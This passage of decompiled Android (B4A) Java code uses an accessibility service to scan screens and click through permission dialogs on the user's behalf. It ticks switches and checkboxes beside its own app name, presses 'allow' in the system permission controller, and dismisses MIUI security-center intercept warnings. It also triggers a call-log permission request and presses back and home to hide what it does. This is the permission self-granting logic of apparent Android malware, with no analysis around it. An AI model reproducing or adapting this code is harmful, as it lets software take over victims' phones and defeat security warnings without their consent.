                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar5 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                            accessibilityEventsListener3.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar6 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar7 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar8 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                            accessibilityEventsListener5.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar9 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case 7:
                            this.state = 33;
                            if (!BA.ObjectToString(this._rootinactivewindow).toLowerCase().contains("entity_header_content")) {
                                break;
                            } else {
                                this.state = 9;
                                break;
                            }
                        case 9:
                            this.state = 10;
                            break;
                        case 10:
                            this.state = 17;
                            this._mp = new Map();
                            List list = this._rootinactivewindow;
                            this.group12 = list;
                            this.index12 = 0;
                            this.groupLen12 = list.getSize();
                            this.state = 89;
                            break;
                        case 12:
                            this.state = 13;
                            break;
                        case 13:
                            this.state = 16;
                            if (!BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                break;
                            } else {
                                this.state = 15;
                                break;
                            }
                        case 15:
                            this.state = 16;
                            backgroundservice backgroundserviceVar10 = clsclassperms_code.mostCurrent._backgroundservice;
                            backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(this._mp.Get("Left")), (int) BA.ObjectToNumber(this._mp.Get("Top")), (int) BA.ObjectToNumber(this._mp.Get("width")), (int) BA.ObjectToNumber(this._mp.Get("Height")), "", "android:id/switch_widget");
                            backgroundservice backgroundserviceVar11 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener7 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case 16:
                            this.state = 90;
                            break;
                        case 17:
                            this.state = 32;
                            backgroundservice backgroundserviceVar12 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener8 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar13 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants4 = backgroundservice._accservconstants;
                            Map map = new Map();
                            java.util.Map map2 = (java.util.Map) Common.Null;
                            java.util.Map map3 = map2;
                            if (accessibilityEventsListener8.PerformNodeActionOnViewWithArgs(true, "android:id/switch_widget", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map, map2))) {
                                this.state = 19;
                                break;
                            } else {
                                this.state = 21;
                                break;
                            }
                        case 19:
                            this.state = 32;
                            backgroundservice backgroundserviceVar14 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener9 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case 21:
                            this.state = 22;
                            break;
                        case 22:
                            this.state = 31;
                            this._mp = new Map();
                            List list2 = this._rootinactivewindow;
                            this.group23 = list2;
                            this.index23 = 0;
                            this.groupLen23 = list2.getSize();
                            this.state = 91;
                            break;
                        case 24:
                            this.state = 25;
                            break;
                        case 25:
                            this.state = 30;
                            if (BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                this.state = 27;
                                break;
                            } else if (!BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                                break;
                            } else {
                                this.state = 29;
                                break;
                            }
                        case 27:
                            this.state = 30;
                            backgroundservice backgroundserviceVar15 = clsclassperms_code.mostCurrent._backgroundservice;
                            backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(this._mp.Get("Left")), (int) BA.ObjectToNumber(this._mp.Get("Top")), (int) BA.ObjectToNumber(this._mp.Get("width")), (int) BA.ObjectToNumber(this._mp.Get("Height")), "", "android:id/switch_widget");
                            backgroundservice backgroundserviceVar16 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener10 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case KeyCodes.KEYCODE_A /* 29 */:
                            this.state = 30;
                            backgroundservice backgroundserviceVar17 = clsclassperms_code.mostCurrent._backgroundservice;
                            backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(this._mp.Get("Left")), (int) BA.ObjectToNumber(this._mp.Get("Top")), (int) BA.ObjectToNumber(this._mp.Get("width")), (int) BA.ObjectToNumber(this._mp.Get("Height")), "", "android:id/checkbox");
                            backgroundservice backgroundserviceVar18 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener11 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case 30:
                            this.state = 92;
                            break;
                        case KeyCodes.KEYCODE_C /* 31 */:
                            this.state = 32;
                            break;
                        case 32:
                            this.state = 33;
                            break;
                        case 33:
                            this.state = 63;
                            if (clsclassperms_code._is_list_perm(this._ba, this._rootinactivewindow)) {
                                this.state = 35;
                                break;
                            } else {
                                this.state = 45;
                                break;
                            }
                        case 35:
                            this.state = 36;
                            break;
                        case 36:
                            this.state = 43;
                            this._mp = new Map();
                            List list3 = this._rootinactivewindow;
                            this.group37 = list3;
                            this.index37 = 0;
                            this.groupLen37 = list3.getSize();
                            this.state = 93;
                            break;
                        case 38:
                            this.state = 39;
                            break;
                        case 39:
                            this.state = 42;
                            String lowerCase = BA.ObjectToString(this._mp.Get("ViewText")).toLowerCase();
                            B4AApplication b4AApplication = Common.Application;
                            if (!lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                                break;
                            } else {
                                this.state = 41;
                                break;
                            }
                        case 41:
                            this.state = 42;
                            backgroundservice backgroundserviceVar19 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener12 = backgroundservice._acs;
                            int ObjectToNumber = (int) BA.ObjectToNumber(this._mp.Get("Left"));
                            int ObjectToNumber2 = (int) BA.ObjectToNumber(this._mp.Get("Top"));
                            int ObjectToNumber3 = (int) BA.ObjectToNumber(this._mp.Get("width"));
                            int ObjectToNumber4 = (int) BA.ObjectToNumber(this._mp.Get("Height"));
                            B4AApplication b4AApplication2 = Common.Application;
                            accessibilityEventsListener12.PerformClick_ByTemp(ObjectToNumber, ObjectToNumber2, ObjectToNumber3, ObjectToNumber4, B4AApplication.getLabelName(), "android:id/title");
                            backgroundservice backgroundserviceVar20 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener13 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case 42:
                            this.state = 94;
                            break;
                        case 43:
                            this.state = 63;
                            break;
                        case 45:
                            this.state = 46;
                            this._isstartfromhere = false;
                            break;
                        case 46:
                            this.state = 62;
                            this._mp = new Map();
                            List list4 = this._rootinactivewindow;
                            this.group46 = list4;
                            this.index46 = 0;
                            this.groupLen46 = list4.getSize();
                            this.state = 95;
                            break;
                        case 48:
                            this.state = 49;
                            break;
                        case KeyCodes.KEYCODE_U /* 49 */:
                            this.state = 52;
                            String lowerCase2 = BA.ObjectToString(this._mp.Get("ViewText")).toLowerCase();
                            B4AApplication b4AApplication3 = Common.Application;
                            if (!lowerCase2.contains(B4AApplication.getLabelName().toLowerCase())) {
                                break;
                            } else {
                                this.state = 51;
                                break;
                            }
                        case KeyCodes.KEYCODE_W /* 51 */:
                            this.state = 52;
                            this._isstartfromhere = true;
                            break;
                        case KeyCodes.KEYCODE_X /* 52 */:
                            this.state = 61;
                            if (!this._isstartfromhere) {
                                break;
                            } else {
                                this.state = 54;
                                break;
                            }
                        case KeyCodes.KEYCODE_Z /* 54 */:
                            this.state = 55;
                            break;
                        case KeyCodes.KEYCODE_COMMA /* 55 */:
                            this.state = 60;
                            if (BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                this.state = 57;
                                break;
                            } else if (!BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                                break;
                            } else {
                                this.state = 59;
                                break;
                            }
                        case KeyCodes.KEYCODE_ALT_LEFT /* 57 */:
                            this.state = 60;
                            backgroundservice backgroundserviceVar21 = clsclassperms_code.mostCurrent._backgroundservice;
                            backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(this._mp.Get("Left")), (int) BA.ObjectToNumber(this._mp.Get("Top")), (int) BA.ObjectToNumber(this._mp.Get("width")), (int) BA.ObjectToNumber(this._mp.Get("Height")), "", "android:id/switch_widget");
                            backgroundservice backgroundserviceVar22 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener14 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case KeyCodes.KEYCODE_SHIFT_LEFT /* 59 */:
                            this.state = 60;
                            backgroundservice backgroundserviceVar23 = clsclassperms_code.mostCurrent._backgroundservice;
                            backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(this._mp.Get("Left")), (int) BA.ObjectToNumber(this._mp.Get("Top")), (int) BA.ObjectToNumber(this._mp.Get("width")), (int) BA.ObjectToNumber(this._mp.Get("Height")), "", "android:id/checkbox");
                            backgroundservice backgroundserviceVar24 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener15 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return;
                        case 60:
                            this.state = 61;
                            break;
                        case KeyCodes.KEYCODE_TAB /* 61 */:
                            this.state = 96;
                            break;
                        case KeyCodes.KEYCODE_SPACE /* 62 */:
                            this.state = 63;
                            break;
                        case 63:
                            this.state = 78;
                            if (this._strpkg.toLowerCase().contains("com.miui.securitycenter") && !clsclassperms_code._check_if_notis(this._ba) && BA.ObjectToString(this._rootinactivewindow).toLowerCase().contains("com.miui.securitycenter:id/intercept_warn_content_end")) {
                                this.state = 65;
                                break;
                            }
                            break;
                        case KeyCodes.KEYCODE_ENVELOPE /* 65 */:
                            this.state = 66;
                            break;
                        case KeyCodes.KEYCODE_ENTER /* 66 */:
                            this.state = 77;
                            this._mp = new Map();
                            List list5 = this._rootinactivewindow;
                            this.group64 = list5;
                            this.index64 = 0;
                            this.groupLen64 = list5.getSize();
                            this.state = 97;
                            break;
                        case KeyCodes.KEYCODE_GRAVE /* 68 */:
                            this.state = 69;
                            break;
                        case KeyCodes.KEYCODE_MINUS /* 69 */:
                            this.state = 76;
                            if (!BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("com.miui.securitycenter:id/check_box")) {
                                break;
                            } else {
                                this.state = 71;
                                break;
                            }
                        case KeyCodes.KEYCODE_LEFT_BRACKET /* 71 */:
                            this.state = 72;
                            this._isstartfromhere = true;
                            break;
                        case KeyCodes.KEYCODE_RIGHT_BRACKET /* 72 */:
                            this.state = 75;
                            if (1.0d != BA.ObjectToNumber(this._mp.Get("checked"))) {
                                break;
                            } else {
                                this.state = 74;
                                break;
                            }
                        case KeyCodes.KEYCODE_SEMICOLON /* 74 */:
                            this.state = 75;
                            clsclassperms_code._timerchecker.setEnabled(false);
                            Common.Sleep(this._ba, this, 10000);
                            this.state = 99;
                            return;
                        case KeyCodes.KEYCODE_APOSTROPHE /* 75 */:
                            this.state = 76;
                            backgroundservice backgroundserviceVar25 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener16 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar26 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants5 = backgroundservice._accservconstants;
                            Map map4 = new Map();
                            java.util.Map map5 = (java.util.Map) Common.Null;
                            java.util.Map map6 = map5;
                            accessibilityEventsListener16.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/check_box", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map4, map5));
                            backgroundservice backgroundserviceVar27 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener17 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            clsclassperms_code._timerchecker.setEnabled(false);
                            Common.Sleep(this._ba, this, 10000);
                            this.state = 100;
                            return;
                        case 76:
                            this.state = 98;
                            break;
                        case KeyCodes.KEYCODE_AT /* 77 */:
                            this.state = 78;
                            break;
                        case KeyCodes.KEYCODE_NUM /* 78 */:
                            this.state = 85;
                            this._mp = new Map();
                            List list6 = this._rootinactivewindow;
                            this.group98 = list6;
                            this.index98 = 0;
                            this.groupLen98 = list6.getSize();
                            this.state = 101;
                            break;
                        case 80:
                            this.state = 81;
                            break;
                        case KeyCodes.KEYCODE_PLUS /* 81 */:
                            this.state = 84;
                            if (BA.ObjectToString(this._mp.Get("viewid")).toLowerCase().contains("android:id/button1") && !this._strpkg.toLowerCase().contains("com.miui.securitycenter")) {
                                this.state = 83;
                                break;
                            }
                            break;
                        case KeyCodes.KEYCODE_NOTIFICATION /* 83 */:
                            this.state = 84;
                            this._isstartfromhere = true;
                            backgroundservice backgroundserviceVar28 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener18 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar29 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants6 = backgroundservice._accservconstants;
                            Map map7 = new Map();
                            java.util.Map map8 = (java.util.Map) Common.Null;
                            java.util.Map map9 = map8;
                            accessibilityEventsListener18.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map7, map8));
                            backgroundservice backgroundserviceVar30 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener19 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar31 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener20 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar32 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants7 = backgroundservice._accservconstants;
                            accessibilityEventsListener20.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar33 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener21 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar34 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener22 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar35 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants8 = backgroundservice._accservconstants;
                            accessibilityEventsListener22.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar36 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener23 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            clsclassperms_code._intpermissionno = 1;
                            IntentWrapper intentWrapper = new IntentWrapper();
                            Intent intent = (Intent) Common.Null;
                            Intent intent2 = intent;
                            clsclassperms_code._inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper, intent);
                            return;
                        case KeyCodes.KEYCODE_SEARCH /* 84 */:
                            this.state = 102;
                            break;
                        case KeyCodes.KEYCODE_MEDIA_PLAY_PAUSE /* 85 */:
                            this.state = 88;
                            break;
                        case KeyCodes.KEYCODE_MEDIA_NEXT /* 87 */:
                            this.state = 88;
                            this.catchState = 0;
                            break;
                        case KeyCodes.KEYCODE_MEDIA_PREVIOUS /* 88 */:
                            this.state = -1;
                            this.catchState = 0;
                            break;
                        case KeyCodes.KEYCODE_MEDIA_REWIND /* 89 */:
                            this.state = 17;
                            if (this.index12 >= this.groupLen12) {
                                break;
                            } else {
                                this.state = 12;
                                Map map10 = new Map();
                                java.util.Map map11 = (java.util.Map) this.group12.Get(this.index12);
                                java.util.Map map12 = map11;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map10, map11);
                                break;
                            }
                        case KeyCodes.KEYCODE_MEDIA_FAST_FORWARD /* 90 */:
                            this.state = 89;
                            this.index12++;
                            break;
                        case KeyCodes.KEYCODE_MUTE /* 91 */:
                            this.state = 31;
                            if (this.index23 >= this.groupLen23) {
                                break;
                            } else {
                                this.state = 24;
                                Map map13 = new Map();
                                java.util.Map map14 = (java.util.Map) this.group23.Get(this.index23);
                                java.util.Map map15 = map14;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map13, map14);
                                break;
                            }
                        case 92:
                            this.state = 91;
                            this.index23++;
                            break;
                        case 93:
                            this.state = 43;
                            if (this.index37 >= this.groupLen37) {
                                break;
                            } else {
                                this.state = 38;
                                Map map16 = new Map();
                                java.util.Map map17 = (java.util.Map) this.group37.Get(this.index37);
                                java.util.Map map18 = map17;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map16, map17);
                                break;
                            }
                        case 94:
                            this.state = 93;
                            this.index37++;
                            break;
                        case 95:
                            this.state = 62;
                            if (this.index46 >= this.groupLen46) {
                                break;
                            } else {
                                this.state = 48;
                                Map map19 = new Map();
                                java.util.Map map20 = (java.util.Map) this.group46.Get(this.index46);
                                java.util.Map map21 = map20;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map19, map20);
                                break;
                            }
                        case 96:
                            this.state = 95;
                            this.index46++;
                            break;
                        case 97:
                            this.state = 77;
                            if (this.index64 >= this.groupLen64) {
                                break;
                            } else {
                                this.state = 68;
                                Map map22 = new Map();
                                java.util.Map map23 = (java.util.Map) this.group64.Get(this.index64);
                                java.util.Map map24 = map23;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map22, map23);
                                break;
                            }
                        case 98:
                            this.state = 97;
                            this.index64++;
                            break;
                        case 99:
                            this.state = 75;
                            backgroundservice backgroundserviceVar37 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener24 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar38 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants9 = backgroundservice._accservconstants;
                            Map map25 = new Map();
                            java.util.Map map26 = (java.util.Map) Common.Null;
                            java.util.Map map27 = map26;
                            accessibilityEventsListener24.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/intercept_warn_allow", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map25, map26));
                            backgroundservice backgroundserviceVar39 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener25 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar40 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener26 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar41 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants10 = backgroundservice._accservconstants;
                            accessibilityEventsListener26.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar42 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener27 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar43 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener28 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar44 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants11 = backgroundservice._accservconstants;
                            accessibilityEventsListener28.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar45 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener29 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            clsclassperms_code._intpermissionno = 1;
                            IntentWrapper intentWrapper2 = new IntentWrapper();
                            Intent intent3 = (Intent) Common.Null;
                            Intent intent4 = intent3;
                            clsclassperms_code._inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper2, intent3);
                            clsclassperms_code._timerchecker.setEnabled(true);
                            return;
                        case 100:
                            this.state = 76;
                            clsclassperms_code._timerchecker.setEnabled(true);
                            backgroundservice backgroundserviceVar46 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener30 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar47 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants12 = backgroundservice._accservconstants;
                            Map map28 = new Map();
                            java.util.Map map29 = (java.util.Map) Common.Null;
                            java.util.Map map30 = map29;
                            accessibilityEventsListener30.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/intercept_warn_allow", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map28, map29));
                            backgroundservice backgroundserviceVar48 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener31 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar49 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener32 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar50 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants13 = backgroundservice._accservconstants;
                            accessibilityEventsListener32.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar51 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener33 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar52 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener34 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar53 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants14 = backgroundservice._accservconstants;
                            accessibilityEventsListener34.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar54 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener35 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            clsclassperms_code._intpermissionno = 1;
                            IntentWrapper intentWrapper3 = new IntentWrapper();
                            Intent intent5 = (Intent) Common.Null;
                            Intent intent6 = intent5;
                            clsclassperms_code._inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper3, intent5);
                            return;
                        case 101:
                            this.state = 85;
                            if (this.index98 >= this.groupLen98) {
                                break;
                            } else {
                                this.state = 80;
                                Map map31 = new Map();
                                java.util.Map map32 = (java.util.Map) this.group98.Get(this.index98);
                                java.util.Map map33 = map32;
                                this._mp = (Map) AbsObjectWrapper.ConvertToWrapper(map31, map32);
                                break;
                            }
                        case 102 /* 102 */:
                            this.state = 101;
                            this.index98++;
                            break;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    (this._ba.processBA == null ? this._ba : this._ba.processBA).setLastException(e);
                }
            }
        }
    }

    public static String _start_perm_others(BA ba, List list, String str, String str2) throws Exception {
        try {
            new Map();
            int size = list.getSize();
            boolean z = false;
            for (int i = 0; i < size; i++) {
                Map map = new Map();
                java.util.Map map2 = (java.util.Map) list.Get(i);
                java.util.Map map3 = map2;
                Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                String lowerCase = BA.ObjectToString(map4.Get("ViewText")).toLowerCase();
                B4AApplication b4AApplication = Common.Application;
                if (lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                    z = true;
                }
                if (z && BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("permission_allow_button".toLowerCase())) {
                    backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                    backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
                    AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                    Map map5 = new Map();
                    java.util.Map map6 = (java.util.Map) Common.Null;
                    java.util.Map map7 = map6;
                    accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "com.android.permissioncontroller:id/permission_allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6));
                    backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                    if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("com.android.packageinstaller:id/permission_allow_button".toLowerCase())) {
                        backgroundservice backgroundserviceVar4 = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                        backgroundservice backgroundserviceVar5 = mostCurrent._backgroundservice;
                        AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                        Map map8 = new Map();
                        java.util.Map map9 = (java.util.Map) Common.Null;
                        java.util.Map map10 = map9;
                        accessibilityEventsListener3.PerformNodeActionOnViewWithArgs(true, "com.android.packageinstaller:id/permission_allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map8, map9));
                        backgroundservice backgroundserviceVar6 = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                    }
                }
            }
            if (!_startcalllogperm(ba)) {
                return "";
            }
            IntentWrapper intentWrapper = new IntentWrapper();
            Intent intent = (Intent) Common.Null;
            Intent intent2 = intent;
            _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper, intent);
            return "";
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
            return "";
        }
    }

    public static String _start_perm_powr(BA ba, List list, String str, String str2) throws Exception {
        new Map();
        int size = list.getSize();
        for (int i = 0; i < size; i++) {
            if (BA.ObjectToString(((Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) list.Get(i))).Get("viewid")).toLowerCase().contains("android:id/button1")) {
                backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
                AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) Common.Null));
                backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                backgroundservice backgroundserviceVar4 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                backgroundservice backgroundserviceVar5 = mostCurrent._backgroundservice;
                AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
